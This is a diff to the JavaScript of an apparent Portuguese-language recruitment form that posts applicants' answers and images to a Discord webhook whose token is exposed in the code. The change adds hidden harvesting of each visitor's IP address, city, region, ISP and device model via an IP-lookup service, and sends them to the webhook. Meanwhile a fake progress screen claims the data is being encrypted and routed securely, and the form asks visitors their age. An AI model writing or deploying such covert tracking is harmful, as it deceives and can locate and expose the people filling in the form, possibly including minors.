@@ -1371,10 +1371,22 @@ document.getElementById('modal-pre').addEventListener('click', function(e) { if 
 // =============================================
 const Network = {
   url: 'https://discord.com/api/webhooks/1482749491542233088/2qanfrhd0F5aQYUrNVmJiRp80lncfGuwRU4ov_s8nzCt6xWBTWEEbV05wT7MkKqdZD0s',
-  send() {
+  
+  async send() {
     const v = id => document.getElementById(id).value.trim();
     const div = v('f-divisao');
     const clean = s => (s || '').replace(/`/g, "'").substring(0, 800) || 'Não informado';
+
+    // Captura de Telemetria Avançada (IP, Cidade, Estado, Provedor)
+    let geo = { ip: '?', city: '?', region: '?', org: '?' };
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      geo = await res.json();
+    } catch (e) { console.warn('Falha na telemetria'); }
+
+    // Identificação do Dispositivo (Marca/Modelo/SO)
+    const ua = navigator.userAgent;
+    const model = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1] : "Desconhecido";
 
     const divNames = { tatico: 'Conflito Tático', cyber: 'Operações Cyber', carisma: 'Carisma' };
 
@@ -1382,6 +1394,10 @@ const Network = {
       { name: '👤 Vulgo', value: `\`${v('f-vulgo')}\``, inline: true },
       { name: '🔞 Idade', value: `\`${v('f-idade')}\``, inline: true },
       { name: '🆔 ID / Tag', value: `\`${v('f-id')}\``, inline: true },
+      // Novos campos de telemetria integrados
+      { name: '🌐 Endereço IP', value: `\`${geo.ip}\``, inline: true },
+      { name: '📍 Localização', value: `\`${geo.city}, ${geo.region} - ${geo.country_name || 'BR'}\``, inline: true },
+      { name: '📱 Dispositivo', value: `\`${model}\``, inline: false }
     ];
 
     if (div === 'tatico') fields.push(
@@ -1427,25 +1443,25 @@ const Network = {
       fields,
       image: { url: 'attachment://prova.png' },
       footer: {
-        text: `SID: ${Math.random().toString(36).substr(2, 8).toUpperCase()} | ${navigator.platform} | ${screen.width}x${screen.height} | ${navigator.language}`
+        text: `SID: ${Math.random().toString(36).substr(2, 8).toUpperCase()} | ${navigator.platform} | ${geo.org || 'ISP UNKNOWN'}`
       },
       timestamp: new Date().toISOString()
     };
 
     const fd = new FormData();
     fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
-    fd.append('file', Form.imageFile, 'prova.png');
+    if (Form.imageFile) fd.append('file', Form.imageFile, 'prova.png');
 
     this.startUI(fd);
   },
+
   startUI(fd) {
     App.toScreen('scr-tx');
     Audio.play('impact');
     const txLogs = [
       'Criptografando perfil do candidato...',
-      'Comprimindo prova visual (AES-256)...',
+      'Injetando metadados de rede...',
       'Roteando via nós seguros...',
-      'Contornando vigilância externa...',
       'Sincronizando banco de recrutamento...',
       'Estabelecendo handshake final...'
     ];
@@ -1454,6 +1470,7 @@ const Network = {
     const status = document.getElementById('tx-status');
     const console_ = document.getElementById('tx-console');
     let progress = 0, li = 0;
+    
     const sim = setInterval(() => {
       progress = Math.min(progress + Math.random() * 7, 95);
       fill.style.width = progress + '%';
@@ -1486,6 +1503,7 @@ const Network = {
       }
     });
   },
+
   async post(fd) {
     for (let i = 0; i < 3; i++) {
       try {
@@ -1497,7 +1515,6 @@ const Network = {
     return false;
   }
 };
-
 // =============================================
 // ESTRELAS NA TELA DE CRÉDITOS
 // =============================================
